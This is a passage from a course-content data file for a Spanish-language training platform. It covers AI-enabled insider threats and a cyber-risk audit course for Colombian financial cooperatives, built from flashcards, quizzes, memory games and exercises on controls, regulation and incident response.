              { term: 'MITRE ATLAS', definition: 'Mapa público de tácticas y técnicas adversarias contra sistemas de IA — 16 tácticas, 84 técnicas, 42 casos reales.' },
              { term: 'OWASP', definition: 'Top 10 para Aplicaciones Agénticas 2026 — ASI03, Abuso de Identidad y Privilegios, es la falla más reportada.' },
              { term: 'OCDE / G20', definition: 'Gobernanza de IA en el sector público (tres pilares) y Mesa Redonda del G20 sobre IA en las Finanzas, jul. 2025.' },
            ]
          },
          {
            type: 'flashcards',
            title: 'Documento clave de cada organismo',
            cards: [
              { front: 'CISA', back: 'Insider Threat Mitigation Guide, actualización 2026 — agrega la "dimensión de seguridad de IA".' },
              { front: 'NIST', back: 'AI Risk Management Framework + Generative AI Profile (AI 600-1).' },
              { front: 'MITRE ATLAS', back: 'Adversarial Threat Landscape for Artificial-Intelligence Systems, v5.1.0 (nov. 2025).' },
              { front: 'OWASP', back: 'Top 10 for Agentic Applications 2026, publicado 9 dic. 2025.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "¿Qué tienen en común los seis marcos oficiales citados en esta ruta?",
              options: [
                "Todos exigen la compra de un software específico para cumplirlos.",
                "Todos son gratuitos, públicos y no están atados a un proveedor de tecnología específico.",
                "Todos aplican exclusivamente dentro de Estados Unidos."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. Son marcos públicos y gratuitos, pensados para orientar gobernanza — no requieren comprar nada ni dependen de un proveedor.",
                incorrect: "No exactamente. Ninguno de los seis marcos exige comprar un producto ni está limitado a un solo país — varios (OCDE/G20) tienen alcance internacional."
              }
            }
          }
        ]
      },
      {
        id: 'ia_ins_s6',
        title: "6. Recomendaciones y Evaluación Final",
        content: [
          { type: 'text', icon: 'CheckCircleIcon', text: "Cuatro líneas de acción, ninguna atada a un producto o proveedor específico — principios de gobernanza aplicables con el presupuesto y la estructura de cualquier ministerio." },
          { type: 'text', icon: 'LockIcon', text: "1) Verificación fuera de banda: ninguna autorización financiera de alto valor debe depender de un único canal audiovisual — se confirma por un segundo canal independiente y preestablecido." },
          { type: 'text', icon: 'BrainCircuitIcon', text: "2) Mínima agencia para IA: la autonomía de un agente debe ser la mínima necesaria para su tarea — inventario de permisos, límites explícitos y registro auditable de sus acciones." },
          { type: 'text', icon: 'AlarmIcon', text: "3) Amenaza interna actualizada: incorporar explícitamente identidad sintética y agentes/herramientas de IA al programa de amenaza interna, alineado a la guía CISA 2026." },
          { type: 'text', icon: 'UserSearchIcon', text: "4) Visibilidad de Shadow AI: inventario de herramientas de IA en uso (aprobadas y no aprobadas), política clara de qué información nunca debe ingresarse a una herramienta externa, y un canal sin sanción para declarar su uso." },
          {
            type: 'memory',
            title: 'Asociar cada marco con lo que resuelve',
            pairs: [
              { term: 'Verificación fuera de banda', definition: 'Responde al vector de identidad sintética (deepfake) en autorizaciones financieras.' },
              { term: 'Mínima agencia', definition: 'Responde al vector de agentes de IA con privilegios excesivos.' },
              { term: 'Amenaza interna actualizada', definition: 'Integra ambos vectores nuevos al programa de gestión de riesgo ya existente.' },
              { term: 'Visibilidad de Shadow AI', definition: 'Responde a la fuga de datos por herramientas de IA no aprobadas ni auditadas.' },
            ]
          },
          {
            type: 'h5p_check',
            title: 'Evaluación Final: IA Ofensiva y el Nuevo Insider',
            description: 'Repaso integral de los seis bloques de esta ruta, previo al cierre de la sesión.',
            questions: [
              {
                question: '¿Cuál es la tesis central de esta ruta sobre el "nuevo paradigma del insider"?',
                options: [
                  { id: 'f1_o1', text: 'La IA generativa y agéntica abre dos vías nuevas —identidad sintética y agentes con privilegios— para cumplir el patrón clásico del insider sin ser personal interno tradicional.', isCorrect: true, score: 10 },
                  { id: 'f1_o2', text: 'Los insiders humanos ya no representan ningún riesgo desde la llegada de la IA.', isCorrect: false, score: 0 },
                  { id: 'f1_o3', text: 'Solo los gobiernos que usan un proveedor específico de IA están en riesgo.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. Esa es la tesis central: dos vías nuevas hacia el patrón clásico del insider (confianza, acceso, intención).'
              },
              {
                question: '¿Qué recomendación responde directamente al vector de "identidad sintética" (deepfake)?',
                options: [
                  { id: 'f2_o1', text: 'Verificación fuera de banda para autorizaciones financieras de alto valor.', isCorrect: true, score: 10 },
                  { id: 'f2_o2', text: 'Mínima agencia para agentes de IA.', isCorrect: false, score: 0 },
                  { id: 'f2_o3', text: 'Visibilidad de Shadow AI.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. La verificación fuera de banda es el control directo frente a una videollamada o llamada con voz clonada.'
              },
              {
                question: '¿Qué organismo publicó "Careful Adoption of Agentic AI Services" en mayo de 2026?',
                options: [
                  { id: 'f3_o1', text: 'CISA/NSA junto con las agencias de ciberseguridad de Australia, Canadá, Nueva Zelanda y Reino Unido (Five Eyes).', isCorrect: true, score: 10 },
                  { id: 'f3_o2', text: 'La Organización Mundial del Comercio.', isCorrect: false, score: 0 },
                  { id: 'f3_o3', text: 'Un consorcio de fabricantes de hardware.', isCorrect: false, score: 0 }
                ],
                feedback: '¡Excelente! Es un ejemplo de cooperación internacional entre agencias de ciberseguridad nacionales — el problema no se resuelve en una sola jurisdicción. Fin de la ruta.'
              }
            ]
          }
        ]
      }
    ]
  },
  auditoria_ciberriesgo: {
    title: "Curso Rápido para Auditores: Cuando el Riesgo Cibernético se Materializa",
    description: "Para comités de riesgo y auditoría de cooperativas financieras: cómo se materializa un incidente, qué le toca a la Auditoría Interna y qué preguntas, indicadores y pruebas aplicar desde el lunes.",
    lastUpdated: "Octubre 2026",
    modules: [
      {
        id: 'aud_intro',
        title: "1. 🚨 Pregunta de Apertura: ¿Cuántas Horas Aguanta?",
        content: [
          { type: 'text', icon: 'AlarmIcon', text: "Imagine esto: hoy, a primera hora, todos los servidores de su cooperativa amanecen cifrados. El core no responde, los asociados llaman y nadie sabe por dónde empezar." },
          { type: 'text', icon: 'QuestionMarkCircleIcon', text: "Antes de seguir, responda con honestidad: ¿cuántas horas podría operar su cooperativa en ese escenario? ¿0 horas, menos de 24, de 1 a 3 días… o no sabe?" },
          { type: 'text', icon: 'PointerIcon', text: "Cómo funciona este curso: 11 módulos cortos con retos, tarjetas, juegos de memoria y un simulacro. Cada módulo completado suma XP y las pruebas le muestran cuánto domina el tema. Puede avanzar a su ritmo hasta el jueves 22 de octubre." },
          {
            type: 'quiz',
            quizData: {
              question: "Si la respuesta honesta de su cooperativa a la pregunta de apertura es \"no sé\", ¿qué significa para la auditoría?",
              options: [
                "Nada grave: es normal no tener ese dato.",
                "Es el hallazgo número uno: la organización no conoce su tolerancia real a la interrupción.",
                "Que la responsabilidad es solo del área de TI."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "¡Exacto! Si nadie sabe cuánto tiempo se puede operar sin sistemas, la cooperativa no conoce su tolerancia a la interrupción. Ese ya es un hallazgo concreto de auditoría.",
                incorrect: "No del todo. \"No sé\" no es una respuesta neutra: es el primer hallazgo de auditoría. Sin ese dato no se puede gestionar la continuidad."
              }
            }
          }
        ]
      },
      {
        id: 'aud_numbers',
        title: "2. El Riesgo Ya se Materializó: las Cifras",
        content: [
          { type: 'text', icon: 'ShieldCheckIcon', text: "La pregunta ya no es \"si nos pasa\", sino \"cuándo\" y \"qué tan preparados estamos\". El ataque es industrial y automatizado: una cooperativa pequeña no es invisible." },
          { type: 'text', icon: 'DocumentTextIcon', text: "Las cifras no son para asustar, son para dimensionar el apetito de riesgo. Voltee cada tarjeta y adivine el dato antes de verlo." },
          {
            type: 'flashcards',
            title: '¿Adivina la cifra? Voltee la tarjeta',
            cards: [
              { front: '¿Qué lugar ocupa Colombia entre los países más atacados de Latinoamérica?', back: 'El 2.º lugar, con 4.090 ataques semanales por organización (Check Point Research, 2026).' },
              { front: '¿Cuántos intentos de ciberataque recibió Colombia en 2025?', back: '10,9 billones (millones de millones) de intentos, según FortiGuard Labs.' },
              { front: '¿Cuántas denuncias por delitos informáticos hubo en Colombia en 2024?', back: '77.866 denuncias (+23 %). De ellas, 37.409 fueron hurtos por medios informáticos (+20 %): exactamente el riesgo de los asociados. Fuente: CCIT – Centro Cibernético Policial.' },
              { front: '¿Cuánto cuesta en promedio una brecha de datos en el mundo?', back: 'US$4,44 millones (IBM, Cost of a Data Breach Report 2025).' },
              { front: '¿Cuánto tiempo toma identificar y contener una brecha?', back: '241 días en promedio (IBM 2025). Casi 8 meses en los que el atacante puede seguir actuando.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "De las 77.866 denuncias por delitos informáticos de 2024, ¿qué conducta fue la más frecuente, y por qué debería preocupar a una cooperativa?",
              options: [
                "El hurto por medios informáticos (37.409 casos): afecta directamente el dinero de los asociados.",
                "Los ataques a páginas web gubernamentales.",
                "La piratería de software."
              ],
              correctOptionIndex: 0,
              feedback: {
                correct: "Correcto. Casi la mitad de las denuncias fueron hurtos por medios informáticos, el riesgo que más directamente toca a los asociados de una cooperativa.",
                incorrect: "No. La conducta más denunciada fue el hurto por medios informáticos (37.409 casos, +20 %), que afecta directamente el dinero de los asociados."
              }
            }
          }
        ]
      },
      {
        id: 'aud_ifx',
        title: "3. Caso Real: el Ataque Llegó por el Proveedor",
        content: [
          { type: 'text', icon: 'ServerIcon', text: "Septiembre de 2023: un ransomware contra IFX Networks, proveedor de hosting y conectividad, afectó a 762 empresas en la región y a unos 1.800 clientes en Colombia, incluidas entidades públicas como la SIC, la Supersalud, el Consejo Superior de la Judicatura y el Ministerio de Salud." },
          { type: 'text', icon: 'AlarmIcon', text: "Durante semanas se interrumpieron trámites de salud, justicia y supervisión. Lo más importante: ninguna de esas entidades fue atacada directamente. El riesgo se materializó en un tercero." },
          { type: 'text', icon: 'QuestionMarkCircleIcon', text: "¿Su cooperativa sabe qué hace su proveedor de core financiero o de hosting si lo cifran? ¿Está escrito en el contrato?" },
          {
            type: 'activity',
            title: 'Reto 1: ¿Qué proveedor, si cae mañana, detiene su cooperativa?',
            duration: '6 min',
            groupSize: 'Individual (o con su comité)',
            goal: 'Identificar los terceros críticos de su cooperativa y si la auditoría los está cubriendo. Esta lista será la base de su plan 30-60-90 al final del curso.',
            downloads: [],
            steps: [
              { title: 'Liste sus proveedores críticos', minutes: '2 min', detail: 'Anote los terceros sin los cuales la cooperativa no opera: core financiero, nube u hosting, pasarela de pagos, call center, proveedor de internet.' },
              { title: 'Revise el plan de auditoría', minutes: '2 min', detail: '¿Alguno de esos proveedores está en el plan de auditoría de este año? Marque cuáles sí y cuáles no.' },
              { title: 'Revise los contratos', minutes: '2 min', detail: '¿El contrato exige reportar incidentes, hacer pruebas de continuidad y le da derecho a auditar? Si no lo sabe, ya tiene una pregunta para la gerencia.' },
            ],
            closing: 'Guarde esta lista: la usará en el último módulo para armar su plan de 30, 60 y 90 días.',
          },
          {
            type: 'quiz',
            quizData: {
              question: "¿Cuál es la principal lección de auditoría del caso IFX Networks?",
              options: [
                "Que solo las entidades públicas son blanco de ataques.",
                "Que el riesgo cibernético puede materializarse en un tercero: los proveedores críticos deben estar en el plan de auditoría y en los contratos.",
                "Que el ransomware solo afecta a los proveedores de internet."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. Ninguna de las entidades afectadas fue atacada directamente. La gestión de terceros (contratos, reporte de incidentes, pruebas de continuidad, derecho a auditar) es un frente clave.",
                incorrect: "No exactamente. La lección es que el riesgo llegó por un proveedor: los terceros críticos deben auditarse y sus contratos deben exigir reporte de incidentes y continuidad."
              }
            }
          }
        ]
      },
      {
        id: 'aud_bowtie',
        title: "4. Anatomía de un Incidente: el Corbatín",
        content: [
          { type: 'text', icon: 'BugIcon', text: "Para prevenir, primero hay que entender la secuencia. El diagrama de corbatín (bow-tie) lo muestra: a la izquierda, las causas; en el centro, el evento (el incidente cibernético); a la derecha, las consecuencias." },
          { type: 'text', icon: 'ShieldCheckIcon', text: "Los controles preventivos (lado izquierdo) reducen la probabilidad. Los controles de respuesta (lado derecho: respaldos, plan de incidentes, seguro) reducen el impacto. Un riesgo se materializa cuando todas las barreras de la izquierda fallan al mismo tiempo." },
          { type: 'text', icon: 'UserSearchIcon', text: "El papel de la auditoría: probar si cada barrera existe, si funciona y si alguien la monitorea." },
          {
            type: 'memory',
            title: '¿Causa o consecuencia? Arme las parejas del corbatín',
            pairs: [
              { term: 'Phishing / SMS falso', definition: 'Causa: abre la puerta al atacante (lado izquierdo).' },
              { term: 'Actualización pendiente', definition: 'Causa: vulnerabilidad sin parchar que el atacante aprovecha.' },
              { term: 'Operación detenida', definition: 'Consecuencia: la cooperativa no puede atender a sus asociados.' },
              { term: 'Fuga de datos personales', definition: 'Consecuencia: exposición de información de asociados y empleados.' },
              { term: 'Respaldo probado y fuera de línea', definition: 'Control de respuesta: reduce el impacto si ocurre el evento.' },
              { term: 'Doble factor (MFA)', definition: 'Control preventivo: reduce la probabilidad de un acceso con contraseña robada.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "En el diagrama de corbatín, ¿qué tipo de control es una prueba de restauración de respaldos?",
              options: [
                "Un control preventivo: evita que ocurra el ataque.",
                "Un control de respuesta: reduce el impacto cuando el evento ya ocurrió.",
                "No es un control, es un trámite de TI."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. Un respaldo no evita el ransomware, pero define si la cooperativa se recupera en horas o en semanas. Por eso está del lado derecho del corbatín.",
                incorrect: "No. El respaldo no impide el ataque: actúa después del evento, reduciendo el impacto. Es un control de respuesta (lado derecho del corbatín)."
              }
            }
          }
        ]
      },
      {
        id: 'aud_scenarios',
        title: "5. Cinco Escenarios que Ya Ocurren",
        content: [
          { type: 'text', icon: 'FishHookIcon', text: "Estos cinco escenarios no son hipotéticos: ya les han ocurrido a cooperativas y entidades financieras. Mientras los repasa, piense cuál ya vivió su cooperativa o una cercana." },
          {
            type: 'interactive',
            title: 'Los 5 escenarios',
            items: [
              { term: '1. Suplantación a asociados', definition: 'SMS, llamadas y apps falsas con la marca de la cooperativa para robar claves o dinero.' },
              { term: '2. Ransomware', definition: 'Secuestro de información: cifran el core y los respaldos, y exigen un rescate.' },
              { term: '3. Fraude del "gerente" (BEC)', definition: 'Un correo falso o comprometido de un directivo ordena una transferencia urgente. BEC = Business Email Compromise.' },
              { term: '4. Falla de un tercero', definition: 'El core, la nube o el hosting de un proveedor es comprometido o deja de funcionar.' },
              { term: '5. Abuso interno', definition: 'Accesos privilegiados sin revisión ni trazabilidad, usados indebidamente por alguien de adentro.' },
            ]
          },
          {
            type: 'memory',
            title: 'Juego: ¿qué escenario es?',
            pairs: [
              { term: 'Suplantación a asociados', definition: 'Un asociado recibe un SMS "de la cooperativa" pidiendo su clave.' },
              { term: 'Ransomware', definition: 'Aparece una nota de rescate y el core no responde.' },
              { term: 'Fraude del "gerente"', definition: 'Tesorería recibe un correo del gerente ordenando un pago urgente a una cuenta nueva.' },
              { term: 'Falla de un tercero', definition: 'El proveedor de hosting cae y con él la banca en línea.' },
              { term: 'Abuso interno', definition: 'Un ex empleado sigue teniendo acceso de administrador meses después de su retiro.' },
            ]
          },
          {
            type: 'activity',
            title: 'Reto 2: un asociado denuncia que le vaciaron la cuenta con una app falsa',
            duration: '6 min',
            groupSize: 'Individual (o con su comité)',
            goal: 'Pensar como auditor frente a un caso de suplantación: quién responde, en cuánto tiempo y qué evidencia se debe pedir.',
            downloads: [],
            steps: [
              { title: '¿Quién responde?', minutes: '2 min', detail: 'Escriba qué área recibe el reclamo, quién lo escala a seguridad y quién habla con el asociado.' },
              { title: '¿En cuánto tiempo?', minutes: '1 min', detail: '¿Existe un tiempo de respuesta definido? ¿Alguien monitorea apps y sitios falsos con la marca de la cooperativa?' },
              { title: '¿Qué evidencia pediría?', minutes: '3 min', detail: 'Piense en: registro del reclamo, trazabilidad de las transacciones, monitoreo de marca, protocolo de comunicación con el asociado y reporte al supervisor.' },
            ],
            closing: 'Si alguna de estas respuestas fue "no sé" o "nadie", acaba de encontrar un hallazgo.',
          },
          {
            type: 'quiz',
            quizData: {
              question: "Tesorería recibe un correo del gerente ordenando una transferencia urgente a una cuenta nueva. ¿Qué control lo detiene?",
              options: [
                "Responder el mismo correo pidiendo confirmación.",
                "Verificar la orden por un canal distinto al correo (por ejemplo, una llamada a un número ya conocido) antes de pagar.",
                "Hacer la transferencia y avisar después."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. Si el correo está suplantado o comprometido, responderlo le contesta al atacante. La verificación por otro canal es el control clave contra el fraude del \"gerente\".",
                incorrect: "No. Si el correo está comprometido, responderlo confirma con el propio atacante. El control es verificar por un canal distinto antes de pagar."
              }
            }
          }
        ]
      },
      {
        id: 'aud_attack_chain',
        title: "6. Un Ataque es una Secuencia (y se Puede Cortar)",
        content: [
          { type: 'text', icon: 'ServerIcon', text: "Un ataque no ocurre en un instante: es una secuencia de etapas. Entre el acceso inicial y la extorsión suelen pasar semanas, y cada etapa es una oportunidad de detección." },
          { type: 'text', icon: 'UserSearchIcon', text: "El valor de la auditoría es verificar que la organización tenga \"ojos\" en cada etapa: monitoreo, alertas, revisión de cuentas privilegiadas y un canal de reclamos de asociados conectado con seguridad." },
          {
            type: 'flashcards',
            title: 'Las 5 etapas y la señal que alguien debería estar mirando',
            cards: [
              { front: '1. Reconocimiento', back: 'Buscan correos, proveedores y sistemas expuestos. Señal: huella pública y dominios falsos parecidos al de la cooperativa.' },
              { front: '2. Acceso inicial', back: 'Phishing, credencial robada o vulnerabilidad. Señal: alertas de inicio de sesión inusual.' },
              { front: '3. Movimiento lateral', back: 'Escalan privilegios y buscan los respaldos. Señal: nuevas cuentas administradoras.' },
              { front: '4. Exfiltración / cifrado', back: 'Copian datos y luego bloquean sistemas. Señal: tráfico saliente anómalo.' },
              { front: '5. Extorsión / fraude', back: 'Rescate, venta de datos, fraude a asociados. Señal: aumento de reclamos y PQR de asociados.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "Aparece una nueva cuenta con permisos de administrador que nadie solicitó. ¿En qué etapa del ataque está probablemente el intruso?",
              options: [
                "Reconocimiento.",
                "Movimiento lateral: está escalando privilegios y buscando los respaldos.",
                "Extorsión."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. Crear cuentas administradoras es típico del movimiento lateral. Si alguien revisa las cuentas privilegiadas, todavía se puede cortar el ataque antes del cifrado.",
                incorrect: "No. Las cuentas administradoras nuevas son la señal del movimiento lateral: el intruso ya entró y está escalando privilegios antes de cifrar."
              }
            }
          }
        ]
      },
      {
        id: 'aud_three_lines',
        title: "7. El Rol de la Auditoría: las Tres Líneas",
        content: [
          { type: 'text', icon: 'HappyUsersIcon', text: "Según el Modelo de las Tres Líneas del IIA (2020), la ciberseguridad es responsabilidad de todos, pero cada uno con un papel distinto. Por encima está el órgano de gobierno: el Consejo de Administración y el Comité de Auditoría." },
          { type: 'text', icon: 'LockIcon', text: "La auditoría NO es dueña del control ni del riesgo. Su valor es la independencia: decirle al Consejo si la primera y la segunda línea realmente funcionan. Un riesgo frecuente en cooperativas pequeñas: que auditoría termine operando la seguridad y pierda su independencia." },
          {
            type: 'memory',
            title: 'Asocie cada línea con su papel',
            pairs: [
              { term: '1ª línea: gerencia, operación y TI', definition: 'Opera y aplica los controles a diario.' },
              { term: '2ª línea: riesgos (SARO), seguridad de la información, cumplimiento', definition: 'Define, acompaña y monitorea.' },
              { term: '3ª línea: Auditoría Interna', definition: 'Asegura de forma independiente y asesora.' },
              { term: 'Externos: Revisoría Fiscal y Supersolidaria', definition: 'Supervisión y control desde fuera de la organización.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "Por falta de personal, le piden a Auditoría Interna administrar el antivirus y las cuentas de usuario. ¿Cuál es el problema?",
              options: [
                "Ninguno: así se aprovecha mejor el equipo.",
                "Auditoría pierde su independencia: no puede asegurar de forma objetiva controles que ella misma opera.",
                "Que auditoría no sabe usar el antivirus."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. Si auditoría opera los controles, termina auditándose a sí misma. Esa tarea es de la primera línea; auditoría asegura de forma independiente.",
                incorrect: "No. El problema de fondo es la independencia: auditoría no puede evaluar con objetividad controles que ella misma opera."
              }
            }
          }
        ]
      },
      {
        id: 'aud_framework',
        title: "8. El Marco que Ya nos Obliga",
        content: [
          { type: 'text', icon: 'DocumentTextIcon', text: "Desde el 5 de febrero de 2026 está vigente el Requisito Temático de Ciberseguridad del IIA (Cybersecurity Topical Requirement), que complementa las Normas Globales de Auditoría Interna (vigentes desde enero de 2025). Es obligatorio para quienes se declaran conformes con las Normas cuando la ciberseguridad está en el alcance de su trabajo." },
          { type: 'text', icon: 'CheckCircleIcon', text: "Cubre tres dominios: Gobierno (estrategia aprobada por el Consejo; roles, recursos y rendición de cuentas), Gestión de riesgos (evaluación y respuesta al riesgo; incidentes, terceros y continuidad) y Procesos de control (diseño y eficacia de controles; cumplimiento, cultura y seguridad física). Úselo como lista de verificación mínima de su programa de auditoría." },
          {
            type: 'interactive',
            title: 'Normas y marcos para cooperativas en Colombia',
            items: [
              { term: 'Supersolidaria · Circular Externa 36 de 2022', definition: 'Seguridad y calidad de la información para servicios financieros (Anexo 2 de la Circular Básica Contable y Financiera, dentro del SARO): 22 requisitos técnicos mínimos, reporte de incidentes y terceros auditables. Aplica a cooperativas de ahorro y crédito y a multiactivas o integrales con sección de ahorro.' },
              { term: 'Ley 1581 de 2012', definition: 'Protección de los datos personales de asociados y empleados.' },
              { term: 'Ley 1273 de 2009', definition: 'Delitos informáticos: acceso abusivo, hurto por medios informáticos y suplantación, entre otros.' },
              { term: 'NIST CSF 2.0 (2024)', definition: 'Marco internacional de referencia en ciberseguridad. Su versión 2.0 añade la función "Gobernar".' },
              { term: 'IIA · Requisito Temático de Ciberseguridad', definition: 'Obligatorio desde el 5 de febrero de 2026 cuando se audita ciberseguridad. Tres dominios: gobierno, gestión de riesgos y procesos de control.' },
              { term: 'SARO', definition: 'Sistema de Administración del Riesgo Operativo (Supersolidaria). El riesgo cibernético debe vivir dentro de esta matriz, no aparte.' },
            ]
          },
          {
            type: 'memory',
            title: 'Asocie cada norma con lo que exige',
            pairs: [
              { term: 'CE 36 de 2022', definition: '22 requisitos técnicos mínimos de seguridad de la información.' },
              { term: 'Ley 1581 de 2012', definition: 'Protección de datos personales.' },
              { term: 'Ley 1273 de 2009', definition: 'Tipifica los delitos informáticos.' },
              { term: 'NIST CSF 2.0', definition: 'Marco internacional que añade la función "Gobernar".' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "¿Dónde debe gestionarse el riesgo cibernético en una cooperativa vigilada por la Supersolidaria?",
              options: [
                "En una matriz aparte, solo del área de TI.",
                "Dentro de la matriz del SARO, como parte del riesgo operativo.",
                "No es necesario gestionarlo si hay un antivirus."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. La CE 36 de 2022 lo ubica dentro del SARO: el riesgo cibernético es riesgo operativo y debe calificarse en la misma matriz.",
                incorrect: "No. El riesgo cibernético debe vivir dentro de la matriz del SARO (riesgo operativo), no en una matriz aparte de TI."
              }
            }
          }
        ]
      },
      {
        id: 'aud_resilience',
        title: "9. Auditar Resiliencia, No Papeles",
        content: [
          { type: 'text', icon: 'BrainCircuitIcon', text: "El Consejo no decide con \"vulnerabilidades críticas\" (CVE): decide con \"podríamos estar 5 días sin operar y perder X millones\". La auditoría moderna habla en pesos, días y asociados afectados." },
          {
            type: 'flashcards',
            title: 'Ayer vs. hoy: voltee para ver cómo se audita ahora',
            cards: [
              { front: 'Ayer: ¿existe la política?', back: 'Hoy: ¿el control funciona bajo ataque?' },
              { front: 'Ayer: lista de chequeo anual', back: 'Hoy: monitoreo continuo con datos.' },
              { front: 'Ayer: informe técnico para TI', back: 'Hoy: informe en pesos y días para el Consejo.' },
              { front: 'Ayer: muestreo de documentos', back: 'Hoy: pruebas reales, como restaurar un respaldo o hacer un phishing simulado.' },
            ]
          },
          {
            type: 'interactive',
            title: 'Tres métricas que el Consejo debería conocer',
            items: [
              { term: 'RTO (tiempo objetivo de recuperación)', definition: 'Cuánto tiempo puede estar detenido un proceso o sistema antes de que el daño sea inaceptable.' },
              { term: 'RPO (punto objetivo de recuperación)', definition: 'Cuántos datos (medidos en tiempo) se puede permitir perder: por ejemplo, las transacciones de las últimas 4 horas.' },
              { term: 'Costo por día de interrupción', definition: 'Cuánto pierde la cooperativa por cada día sin operar: ingresos, multas, atención a asociados y reputación.' },
            ]
          },
          {
            type: 'activity',
            title: 'Reto 3: ¿su último informe al Consejo dijo cuántos días podría estar detenida la cooperativa?',
            duration: '7 min',
            groupSize: 'Individual (o con su comité)',
            goal: 'Llevar el riesgo cibernético al lenguaje del Consejo: días de interrupción y costo por día.',
            downloads: [],
            steps: [
              { title: 'Busque el dato', minutes: '2 min', detail: '¿Su cooperativa tiene definidos el RTO y el RPO de sus sistemas críticos (core, banca en línea, pagos)?' },
              { title: 'Póngale precio', minutes: '3 min', detail: 'Estime de forma gruesa cuánto costaría cada día de interrupción. No necesita precisión: necesita un orden de magnitud.' },
              { title: '¿Qué le impide medirlo?', minutes: '2 min', detail: 'Si no tiene estos datos, anote qué falta: un análisis de impacto al negocio, información de TI, apoyo de la gerencia…' },
            ],
            closing: 'Si nadie en la cooperativa tiene estas cifras, ese es un hallazgo concreto para su próximo informe.',
          },
          {
            type: 'quiz',
            quizData: {
              question: "¿Cuál de estos hallazgos le sirve más al Consejo para tomar una decisión?",
              options: [
                "\"Se identificaron 37 CVE críticas en los servidores.\"",
                "\"Ante un ransomware, la cooperativa podría estar 5 días sin operar, con un costo estimado de X millones por día.\"",
                "\"La política de seguridad fue actualizada el año pasado.\""
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. Días de interrupción y pesos de impacto son el lenguaje con el que el Consejo puede priorizar inversiones y aceptar o no un riesgo.",
                incorrect: "No. Los datos técnicos o documentales no le dicen al Consejo qué arriesga. Lo útil es traducirlo a días sin operar y pesos de impacto."
              }
            }
          }
        ]
      },
      {
        id: 'aud_toolbox',
        title: "10. 🧰 Caja de Herramientas y Simulacro Relámpago",
        content: [
          { type: 'text', icon: 'PointerIcon', text: "Pasamos de lo conceptual a lo práctico: preguntas, indicadores y pruebas que puede aplicar desde el lunes." },
          {
            type: 'flashcards',
            title: 'Las 7 preguntas clave del auditor',
            cards: [
              { front: 'Pregunta 1', back: '¿Cuáles son nuestras "joyas de la corona" (datos y sistemas críticos)?' },
              { front: 'Pregunta 2 🔴', back: '¿Cuándo restauramos por última vez un respaldo completo? (Una de las dos que más hallazgos generan.)' },
              { front: 'Pregunta 3 🔴', back: '¿Tenemos doble factor (MFA) en correo, VPN, core y cuentas administradoras? (La otra que más hallazgos genera.)' },
              { front: 'Pregunta 4', back: '¿Quién tiene accesos privilegiados hoy y quién los revisó?' },
              { front: 'Pregunta 5', back: '¿Qué terceros críticos acceden a nuestros datos y cuándo se evaluaron?' },
              { front: 'Pregunta 6', back: '¿Cuánto tardamos en detectar y contener un incidente?' },
              { front: 'Pregunta 7', back: '¿El Consejo ha participado en un simulacro de crisis?' },
            ]
          },
          {
            type: 'memory',
            title: 'Indicadores clave de riesgo (KRI): asocie cada indicador con su meta sugerida',
            pairs: [
              { term: 'Actualizaciones críticas aplicadas en menos de 30 días', definition: '≥ 95 %' },
              { term: 'Cuentas privilegiadas y remotas con MFA', definition: '100 %' },
              { term: 'Pruebas exitosas de restauración de respaldos', definition: '4 al año' },
              { term: 'Clic en phishing simulado', definition: '< 5 %' },
            ]
          },
          { type: 'text', icon: 'CheckCircleIcon', text: "Un KRI anticipa la materialización; un indicador de desempeño la cuenta después. Propuesta: que el Comité reciba estos 4 indicadores cada trimestre, con semáforo. Las metas son una referencia; cada cooperativa las ajusta a su apetito de riesgo." },
          { type: 'text', icon: 'ServerIcon', text: "Programa de auditoría en 4 pasos: (1) Planear: activos críticos, terceros y mapa de calor. (2) Probar: restaurar respaldos, revisar accesos y MFA, phishing simulado. (3) Informar: hallazgos en pesos, días y asociados afectados. (4) Seguir: planes con dueño, fecha y KRI." },
          {
            type: 'activity',
            title: 'Simulacro relámpago: lunes, 7:45 a. m.',
            duration: '10 min',
            groupSize: 'Individual (o con su comité)',
            goal: 'Nota de rescate en pantalla. El core no responde. Los asociados reportan SMS "de la cooperativa" pidiendo claves. Usted es el auditor: responda las tres preguntas antes de ver las respuestas esperadas.',
            downloads: [],
            steps: [
              { title: '1. ¿Qué controles fallaron?', minutes: '3 min', detail: 'Respuesta esperada: MFA, parches, respaldos fuera de línea y monitoreo de marca (los SMS falsos).' },
              { title: '2. ¿Qué evidencia preservaría?', minutes: '3 min', detail: 'Respuesta esperada: bitácoras (logs), imágenes forenses y cadena de custodia. No apagar equipos sin criterio: se pierde la evidencia en memoria.' },
              { title: '3. ¿Qué le informa al Consejo en 24 horas?', minutes: '4 min', detail: 'Respuesta esperada: alcance, impacto en asociados, decisiones requeridas, plan de comunicaciones y reporte a la Supersolidaria.' },
            ],
            closing: 'Compare sus respuestas con las esperadas. Lo que no se le ocurrió es justamente lo que conviene preguntar a la gerencia esta semana.',
          },
          {
            type: 'quiz',
            quizData: {
              question: "De las 7 preguntas clave, ¿cuáles dos marcan más diferencia frente a un ransomware?",
              options: [
                "Las de las joyas de la corona y el simulacro del Consejo.",
                "Cuándo se restauró por última vez un respaldo completo, y si hay MFA en todo acceso remoto y privilegiado.",
                "Las de los terceros críticos y el tiempo de detección."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "¡Correcto! Respaldos probados y fuera de línea, y MFA en todo acceso remoto y privilegiado: son las dos que más hallazgos generan y las que más diferencia hacen.",
